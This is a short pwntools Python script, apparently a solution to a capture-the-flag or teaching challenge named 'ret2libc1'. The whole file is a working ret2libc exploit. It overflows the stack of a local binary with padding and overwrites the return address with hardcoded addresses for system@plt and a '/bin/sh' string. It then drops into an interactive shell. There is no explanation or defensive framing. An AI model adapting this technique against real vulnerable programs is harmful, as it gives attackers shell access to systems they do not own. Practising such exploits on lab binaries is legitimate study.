from pwn import *

system_plt_addr = 0x08048460
bin_sh_addr= 0x08048720

offset=0x6c+4

sh=process("./ret2libc1")
sh.sendline(b'M'*offset\
	+p32(system_plt_addr)\
	+p32(0xaaaaaaaa)\
	+p32(bin_sh_addr)
	)

sh.interactive()
